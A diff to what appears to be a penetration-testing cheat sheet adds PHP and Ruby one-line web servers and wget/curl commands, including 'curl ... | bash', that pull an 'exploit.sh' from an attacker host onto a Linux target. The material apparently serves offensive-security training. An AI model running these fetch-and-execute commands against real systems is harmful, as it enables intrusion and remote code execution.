@@ -814,7 +814,20 @@ $ curl http://<IP address>:8000/exploit.sh | bash
 - PHP Server (Kali -> Linux)
 
 ```
+$ php -S 0.0.0.0:8000
+$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
+$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
+$ curl http://<IP address>:8000/exploit.sh | bash
 $ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
+```
+
+- Ruby Server (Kali -> Linux)
+
+```
+$ ruby -run -ehttpd . -p8000
+$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
+$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
+$ curl http://<IP address>:8000/exploit.sh | bash
 ```
 
 - SCP Downloads (Kali -> Windows)
